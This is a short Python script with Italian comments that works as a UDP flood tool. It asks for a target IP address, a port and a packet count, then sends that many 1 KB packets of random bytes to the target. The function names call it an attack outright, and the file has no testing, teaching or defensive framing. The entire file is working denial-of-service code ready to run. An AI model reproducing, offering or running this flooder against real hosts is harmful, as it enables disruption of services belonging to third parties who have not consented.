import socket,random

# Creazione del socket UDP
soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Inserimento dei dati da parte dell'utente
ip_targhet = input("Inserisci l'IP da targhettare: ")
porta_targhet = int(input("Inserisci la porta da targhettare: "))
numero_pacchetti = int(input("Inserisci quanti pacchetti da 1 KB vuoi inviare: "))

# Funzione per generare pacchetti di byte casuali
def generatore_attacco_bytes(grandezza):
    return random.randbytes(grandezza)

# Funzione per inviare i pacchetti
def targhet(ip_targhet, porta_targhet, numero_pacchetti):
    grandezza_pacchetti = 1024  # Dimensione del pacchetto in byte (1 KB)
    
    for x in range(numero_pacchetti):
        pacchetti = generatore_attacco_bytes(grandezza_pacchetti)
        soc.sendto(pacchetti, (ip_targhet, porta_targhet))

targhet(ip_targhet, porta_targhet, numero_pacchetti)